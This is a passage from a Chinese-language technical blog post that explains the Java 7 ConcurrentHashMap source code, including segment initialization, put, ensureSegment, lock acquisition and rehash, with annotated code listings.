key.equals(k))))</span><br><span class="line">            <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="java7-concurrenthashmap">Java7 ConcurrentHashMap</span></h2><p>ConcurrentHashMap 和 HashMap 思路是差不多的，但是因为它支持并发操作，所以要复杂一些。</p><p>整个 ConcurrentHashMap 由一个个 Segment 组成，Segment 代表”部分“或”一段“的意思，所以很多地方都会将其描述为<strong>分段锁</strong>。注意，行文中，我很多地方用了“<strong>槽</strong>”来代表一个 segment。</p><p>简单理解就是，ConcurrentHashMap 是一个 Segment 数组，Segment 通过继承 ReentrantLock 来进行加锁，所以每次需要加锁的操作锁住的是一个 segment，这样只要保证每个 Segment 是线程安全的，也就实现了全局的线程安全。</p><p><img src="https://www.javadoop.com/blogimages/map/3.png" alt="3"></p><p><strong>concurrencyLevel</strong>：并行级别、并发数、Segment 数，怎么翻译不重要，理解它。默认是 16，也就是说 ConcurrentHashMap 有 16 个 Segments，所以理论上，这个时候，最多可以同时支持 16 个线程并发写，只要它们的操作分别分布在不同的 Segment 上。这个值可以在初始化的时候设置为其他值，但是一旦初始化以后，它是不可以扩容的。</p><p>再具体到每个 Segment 内部，其实每个 Segment 很像之前介绍的 HashMap，不过它要保证线程安全，所以处理起来要麻烦些。</p><h3><span id="初始化">初始化</span></h3><p>initialCapacity：初始容量，这个值指的是整个 ConcurrentHashMap 的初始容量，实际操作的时候需要平均分给每个 Segment。</p><p>loadFactor：负载因子，之前我们说了，Segment 数组不可以扩容，所以这个负载因子是给每个 Segment 内部使用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConcurrentHashMap</span><span class="params">(<span class="type">int</span> initialCapacity,</span></span><br><span class="line"><span class="params">                         <span class="type">float</span> loadFactor, <span class="type">int</span> concurrencyLevel)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(loadFactor &gt; <span class="number">0</span>) || initialCapacity &lt; <span class="number">0</span> || concurrencyLevel &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">    <span class="keyword">if</span> (concurrencyLevel &gt; MAX_SEGMENTS)</span><br><span class="line">        concurrencyLevel = MAX_SEGMENTS;</span><br><span class="line">    <span class="comment">// Find power-of-two sizes best matching arguments</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">sshift</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ssize</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 计算并行级别 ssize，因为要保持并行级别是 2 的 n 次方</span></span><br><span class="line">    <span class="keyword">while</span> (ssize &lt; concurrencyLevel) &#123;</span><br><span class="line">        ++sshift;</span><br><span class="line">        ssize &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 我们这里先不要那么烧脑，用默认值，concurrencyLevel 为 16，sshift 为 4</span></span><br><span class="line">    <span class="comment">// 那么计算出 segmentShift 为 28，segmentMask 为 15，后面会用到这两个值</span></span><br><span class="line">    <span class="built_in">this</span>.segmentShift = <span class="number">32</span> - sshift;</span><br><span class="line">    <span class="built_in">this</span>.segmentMask = ssize - <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &gt; MAXIMUM_CAPACITY)</span><br><span class="line">        initialCapacity = MAXIMUM_CAPACITY;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// initialCapacity 是设置整个 map 初始的大小，</span></span><br><span class="line">    <span class="comment">// 这里根据 initialCapacity 计算 Segment 数组中每个位置可以分到的大小</span></span><br><span class="line">    <span class="comment">// 如 initialCapacity 为 64，那么每个 Segment 或称之为&quot;槽&quot;可以分到 4 个</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> initialCapacity / ssize;</span><br><span class="line">    <span class="keyword">if</span> (c * ssize &lt; initialCapacity)</span><br><span class="line">        ++c;</span><br><span class="line">    <span class="comment">// 默认 MIN_SEGMENT_TABLE_CAPACITY 是 2，这个值也是有讲究的，因为这样的话，对于具体的槽上，</span></span><br><span class="line">    <span class="comment">// 插入一个元素不至于扩容，插入第二个的时候才会扩容</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> MIN_SEGMENT_TABLE_CAPACITY; </span><br><span class="line">    <span class="keyword">while</span> (cap &lt; c)</span><br><span class="line">        cap &lt;&lt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建 Segment 数组，</span></span><br><span class="line">    <span class="comment">// 并创建数组的第一个元素 segment[0]</span></span><br><span class="line">    Segment&lt;K,V&gt; s0 =</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Segment</span>&lt;K,V&gt;(loadFactor, (<span class="type">int</span>)(cap * loadFactor),</span><br><span class="line">                         (HashEntry&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">HashEntry</span>[cap]);</span><br><span class="line">    Segment&lt;K,V&gt;[] ss = (Segment&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Segment</span>[ssize];</span><br><span class="line">    <span class="comment">// 往数组写入 segment[0]</span></span><br><span class="line">    UNSAFE.putOrderedObject(ss, SBASE, s0); <span class="comment">// ordered write of segments[0]</span></span><br><span class="line">    <span class="built_in">this</span>.segments = ss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化完成，我们得到了一个 Segment 数组。</p><p>我们就当是用 new ConcurrentHashMap() 无参构造函数进行初始化的，那么初始化完成后：</p><ul><li>Segment 数组长度为 16，不可以扩容</li><li>Segment[i] 的默认大小为 2，负载因子是 0.75，得出初始阈值为 1.5，也就是以后插入第一个元素不会触发扩容，插入第二个会进行第一次扩容</li><li>这里初始化了 segment[0]，其他位置还是 null，至于为什么要初始化 segment[0]，后面的代码会介绍</li><li>当前 segmentShift 的值为 32 - 4 &#x3D; 28，segmentMask 为 16 - 1 &#x3D; 15，姑且把它们简单翻译为<strong>移位数</strong>和<strong>掩码</strong>，这两个值马上就会用到</li></ul><h3><span id="put-过程分析">put 过程分析</span></h3><p>我们先看 put 的主流程，对于其中的一些关键细节操作，后面会进行详细介绍。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    Segment&lt;K,V&gt; s;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    <span class="comment">// 1. 计算 key 的 hash 值</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="comment">// 2. 根据 hash 值找到 Segment 数组中的位置 j</span></span><br><span class="line">    <span class="comment">//    hash 是 32 位，无符号右移 segmentShift(28) 位，剩下高 4 位，</span></span><br><span class="line">    <span class="comment">//    然后和 segmentMask(15) 做一次与操作，也就是说 j 是 hash 值的高 4 位，也就是槽的数组下标</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> (hash &gt;&gt;&gt; segmentShift) &amp; segmentMask;</span><br><span class="line">    <span class="comment">// 刚刚说了，初始化的时候初始化了 segment[0]，但是其他位置还是 null，</span></span><br><span class="line">    <span class="comment">// ensureSegment(j) 对 segment[j] 进行初始化</span></span><br><span class="line">    <span class="keyword">if</span> ((s = (Segment&lt;K,V&gt;)UNSAFE.getObject          <span class="comment">// nonvolatile; recheck</span></span><br><span class="line">         (segments, (j &lt;&lt; SSHIFT) + SBASE)) == <span class="literal">null</span>) <span class="comment">//  in ensureSegment</span></span><br><span class="line">        s = ensureSegment(j);</span><br><span class="line">    <span class="comment">// 3. 插入新值到 槽 s 中</span></span><br><span class="line">    <span class="keyword">return</span> s.put(key, hash, value, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一层皮很简单，根据 hash 值很快就能找到相应的 Segment，之后就是 Segment 内部的 put 操作了。</p><p>Segment 内部是由 <strong>数组+链表</strong> 组成的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> V <span class="title function_">put</span><span class="params">(K key, <span class="type">int</span> hash, V value, <span class="type">boolean</span> onlyIfAbsent)</span> &#123;</span><br><span class="line">    <span class="comment">// 在往该 segment 写入前，需要先获取该 segment 的独占锁</span></span><br><span class="line">    <span class="comment">//    先看主流程，后面还会具体介绍这部分内容</span></span><br><span class="line">    HashEntry&lt;K,V&gt; node = tryLock() ? <span class="literal">null</span> :</span><br><span class="line">        scanAndLockForPut(key, hash, value);</span><br><span class="line">    V oldValue;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 这个是 segment 内部的数组</span></span><br><span class="line">        HashEntry&lt;K,V&gt;[] tab = table;</span><br><span class="line">        <span class="comment">// 再利用 hash 值，求应该放置的数组下标</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (tab.length - <span class="number">1</span>) &amp; hash;</span><br><span class="line">        <span class="comment">// first 是数组该位置处的链表的表头</span></span><br><span class="line">        HashEntry&lt;K,V&gt; first = entryAt(tab, index);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 下面这串 for 循环虽然很长，不过也很好理解，想想该位置没有任何元素和已经存在一个链表这两种情况</span></span><br><span class="line">        <span class="keyword">for</span> (HashEntry&lt;K,V&gt; e = first;;) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123;</span><br><span class="line">                K k;</span><br><span class="line">                <span class="keyword">if</span> ((k = e.key) == key ||</span><br><span class="line">                    (e.hash == hash &amp;&amp; key.equals(k))) &#123;</span><br><span class="line">                    oldValue = e.value;</span><br><span class="line">                    <span class="keyword">if</span> (!onlyIfAbsent) &#123;</span><br><span class="line">                        <span class="comment">// 覆盖旧值</span></span><br><span class="line">                        e.value = value;</span><br><span class="line">                        ++modCount;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 继续顺着链表走</span></span><br><span class="line">                e = e.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// node 到底是不是 null，这个要看获取锁的过程，不过和这里都没有关系。</span></span><br><span class="line">                <span class="comment">// 如果不为 null，那就直接将它设置为链表表头；如果是null，初始化并设置为链表表头。</span></span><br><span class="line">                <span class="keyword">if</span> (node != <span class="literal">null</span>)</span><br><span class="line">                    node.setNext(first);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    node = <span class="keyword">new</span> <span class="title class_">HashEntry</span>&lt;K,V&gt;(hash, key, value, first);</span><br><span class="line">                </span><br><span class="line">                <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> count + <span class="number">1</span>;</span><br><span class="line">                <span class="comment">// 如果超过了该 segment 的阈值，这个 segment 需要扩容</span></span><br><span class="line">                <span class="keyword">if</span> (c &gt; threshold &amp;&amp; tab.length &lt; MAXIMUM_CAPACITY)</span><br><span class="line">                    rehash(node); <span class="comment">// 扩容后面也会具体分析</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">// 没有达到阈值，将 node 放到数组 tab 的 index 位置，</span></span><br><span class="line">                    <span class="comment">// 其实就是将新的节点设置成原链表的表头</span></span><br><span class="line">                    setEntryAt(tab, index, node);</span><br><span class="line">                ++modCount;</span><br><span class="line">                count = c;</span><br><span class="line">                oldValue = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 解锁</span></span><br><span class="line">        unlock();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体流程还是比较简单的，由于有独占锁的保护，所以 segment 内部的操作并不复杂。至于这里面的并发问题，我们稍后再进行介绍。</p><p>到这里 put 操作就结束了，接下来，我们说一说其中几步关键的操作。</p><h4><span id="初始化槽-ensuresegment">初始化槽: ensureSegment</span></h4><p>ConcurrentHashMap 初始化的时候会初始化第一个槽 segment[0]，对于其他槽来说，在插入第一个值的时候进行初始化。</p><p>这里需要考虑并发，因为很可能会有多个线程同时进来初始化同一个槽 segment[k]，不过只要有一个成功了就可以。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Segment&lt;K,V&gt; <span class="title function_">ensureSegment</span><span class="params">(<span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> Segment&lt;K,V&gt;[] ss = <span class="built_in">this</span>.segments;</span><br><span class="line">    <span class="type">long</span> <span class="variable">u</span> <span class="operator">=</span> (k &lt;&lt; SSHIFT) + SBASE; <span class="comment">// raw offset</span></span><br><span class="line">    Segment&lt;K,V&gt; seg;</span><br><span class="line">    <span class="keyword">if</span> ((seg = (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(ss, u)) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 这里看到为什么之前要初始化 segment[0] 了，</span></span><br><span class="line">        <span class="comment">// 使用当前 segment[0] 处的数组长度和负载因子来初始化 segment[k]</span></span><br><span class="line">        <span class="comment">// 为什么要用“当前”，因为 segment[0] 可能早就扩容过了</span></span><br><span class="line">        Segment&lt;K,V&gt; proto = ss[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> proto.table.length;</span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> proto.loadFactor;</span><br><span class="line">        <span class="type">int</span> <span class="variable">threshold</span> <span class="operator">=</span> (<span class="type">int</span>)(cap * lf);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 初始化 segment[k] 内部的数组</span></span><br><span class="line">        HashEntry&lt;K,V&gt;[] tab = (HashEntry&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">HashEntry</span>[cap];</span><br><span class="line">        <span class="keyword">if</span> ((seg = (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(ss, u))</span><br><span class="line">            == <span class="literal">null</span>) &#123; <span class="comment">// 再次检查一遍该槽是否被其他线程初始化了。</span></span><br><span class="line">          </span><br><span class="line">            Segment&lt;K,V&gt; s = <span class="keyword">new</span> <span class="title class_">Segment</span>&lt;K,V&gt;(lf, threshold, tab);</span><br><span class="line">            <span class="comment">// 使用 while 循环，内部用 CAS，当前线程成功设值或其他线程成功设值后，退出</span></span><br><span class="line">            <span class="keyword">while</span> ((seg = (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(ss, u))</span><br><span class="line">                   == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (UNSAFE.compareAndSwapObject(ss, u, <span class="literal">null</span>, seg = s))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> seg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的来说，ensureSegment(int k) 比较简单，对于并发操作使用 CAS 进行控制。</p><blockquote><p>我没搞懂这里为什么要搞一个 while 循环，CAS 失败不就代表有其他线程成功了吗，为什么要再进行判断？</p><p>感谢评论区的<strong>李子木</strong>，如果当前线程 CAS 失败，这里的 while 循环是为了将 seg 赋值返回。</p></blockquote><h4><span id="获取写入锁-scanandlockforput">获取写入锁: scanAndLockForPut</span></h4><p>前面我们看到，在往某个 segment 中 put 的时候，首先会调用  node &#x3D; tryLock() ? null : scanAndLockForPut(key, hash, value)，也就是说先进行一次 tryLock() 快速获取该 segment 的独占锁，如果失败，那么进入到 scanAndLockForPut 这个方法来获取锁。</p><p>下面我们来具体分析这个方法中是怎么控制加锁的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> HashEntry&lt;K,V&gt; <span class="title function_">scanAndLockForPut</span><span class="params">(K key, <span class="type">int</span> hash, V value)</span> &#123;</span><br><span class="line">    HashEntry&lt;K,V&gt; first = entryForHash(<span class="built_in">this</span>, hash);</span><br><span class="line">    HashEntry&lt;K,V&gt; e = first;</span><br><span class="line">    HashEntry&lt;K,V&gt; node = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">retries</span> <span class="operator">=</span> -<span class="number">1</span>; <span class="comment">// negative while locating node</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 循环获取锁</span></span><br><span class="line">    <span class="keyword">while</span> (!tryLock()) &#123;</span><br><span class="line">        HashEntry&lt;K,V&gt; f; <span class="comment">// to recheck first below</span></span><br><span class="line">        <span class="keyword">if</span> (retries &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (node == <span class="literal">null</span>) <span class="comment">// speculatively create node</span></span><br><span class="line">                    <span class="comment">// 进到这里说明数组该位置的链表是空的，没有任何元素</span></span><br><span class="line">                    <span class="comment">// 当然，进到这里的另一个原因是 tryLock() 失败，所以该槽存在并发，不一定是该位置</span></span><br><span class="line">                    node = <span class="keyword">new</span> <span class="title class_">HashEntry</span>&lt;K,V&gt;(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">                retries = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(e.key))</span><br><span class="line">                retries = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// 顺着链表往下走</span></span><br><span class="line">                e = e.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 重试次数如果超过 MAX_SCAN_RETRIES（单核1多核64），那么不抢了，进入到阻塞队列等待锁</span></span><br><span class="line">        <span class="comment">//    lock() 是阻塞方法，直到获取锁后返回</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (++retries &gt; MAX_SCAN_RETRIES) &#123;</span><br><span class="line">            lock();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((retries &amp; <span class="number">1</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                 <span class="comment">// 这个时候是有大问题了，那就是有新的元素进到了链表，成为了新的表头</span></span><br><span class="line">                 <span class="comment">//     所以这边的策略是，相当于重新走一遍这个 scanAndLockForPut 方法</span></span><br><span class="line">                 (f = entryForHash(<span class="built_in">this</span>, hash)) != first) &#123;</span><br><span class="line">            e = first = f; <span class="comment">// re-traverse if entry changed</span></span><br><span class="line">            retries = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法有两个出口，一个是 tryLock() 成功了，循环终止，另一个就是重试次数超过了 MAX_SCAN_RETRIES，进到 lock() 方法，此方法会阻塞等待，直到成功拿到独占锁。</p><p>这个方法就是看似复杂，但是其实就是做了一件事，那就是<strong>获取该 segment 的独占锁</strong>，如果需要的话顺便实例化了一下 node。</p><h4><span id="扩容-rehash">扩容: rehash</span></h4><p>重复一下，segment 数组不能扩容，扩容是 segment 数组某个位置内部的数组 HashEntry&lt;K,V&gt;[] 进行扩容，扩容后，容量为原来的 2 倍。</p><p>首先，我们要回顾一下触发扩容的地方，put 的时候，如果判断该值的插入会导致该 segment 的元素个数超过阈值，那么先进行扩容，再插值，读者这个时候可以回去 put 方法看一眼。</p><p>该方法不需要考虑并发，因为到这里的时候，是持有该 segment 的独占锁的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法参数上的 node 是这次扩容后，需要添加到新的数组中的数据。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">rehash</span><span class="params">(HashEntry&lt;K,V&gt; node)</span> &#123;</span><br><span class="line">    HashEntry&lt;K,V&gt;[] oldTable = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldCapacity</span> <span class="operator">=</span> oldTable.length;</span><br><span class="line">    <span class="comment">// 2 倍</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">newCapacity</span> <span class="operator">=</span> oldCapacity &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    threshold = (<span class="type">int</span>)(newCapacity * loadFactor);</span><br><span class="line">    <span class="comment">// 创建新数组</span></span><br><span class="line">    HashEntry&lt;K,V&gt;[] newTable =</span><br><span class="line">        (HashEntry&lt;K,V&gt;[]) <span class="keyword">new</span> <span class="title class_">HashEntry</span>[newCapacity];</span><br><span class="line">    <span class="comment">// 新的掩码，如从 16 扩容到 32，那么 sizeMask 为 31，对应二进制 ‘000...00011111’</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">sizeMask</span> <span class="operator">=</span> newCapacity - <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 遍历原数组，老套路，将原数组位置 i 处的链表拆分到 新数组位置 i 和 i+oldCap 两个位置</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; oldCapacity ; i++) &#123;</span><br><span class="line">        <span class="comment">// e 是链表的第一个元素</span></span><br><span class="line">        HashEntry&lt;K,V&gt; e = oldTable[i];</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123;</span><br><span class="line">            HashEntry&lt;K,V&gt; next = e.next;</span><br><span class="line">            <span class="comment">// 计算应该放置在新数组中的位置，</span></span><br><span class="line">            <span class="comment">// 假设原数组长度为 16，e 在 oldTable[3] 处，那么 idx 只可能是 3 或者是 3 + 16 = 19</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> e.hash &amp; sizeMask;</span><br><span class="line">            <span class="keyword">if</span> (next == <span class="literal">null</span>)   <span class="comment">// 该位置处只有一个元素，那比较好办</span></span><br><span class="line">                newTable[idx] = e;</span><br><span class="line">            <span class="keyword">else</span> &#123; <span class="comment">// Reuse consecutive sequence at same slot</span></span><br><span class="line">                <span class="comment">// e 是链表表头</span></span><br><span class="line">                HashEntry&lt;K,V&gt; lastRun = e;</span><br><span class="line">                <span class="comment">// idx 是当前链表的头结点 e 的新位置</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">lastIdx</span> <span class="operator">=</span> idx;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 下面这个 for 循环会找到一个 lastRun 节点，这个节点之后的所有元素是将要放到一起的</span></span><br><span class="line">                <span class="keyword">for</span> (HashEntry&lt;K,V&gt; last = next;</span><br><span class="line">                     last != <span class="literal">null</span>;</span><br><span class="line">                     last = last.next) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> last.hash &amp; sizeMask;</span><br><span class="line">                    <span class="keyword">if</span> (k != lastIdx) &#123;</span><br><span class="line">                        lastIdx = k;</span><br><span class="line">                        lastRun = last;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 将 lastRun 及其之后的所有节点组成的这个链表放到 lastIdx 这个位置</span></span><br><span class="line">                newTable[lastIdx] = lastRun;</span><br><span class="line">                <span class="comment">// 下面的操作是处理 lastRun 之前的节点，</span></span><br><span class="line">                <span class="comment">//    这些节点可能分配在另一个链表中，也可能分配到上面的那个链表中</span></span><br><span class="line">                <span class="keyword">for</span> 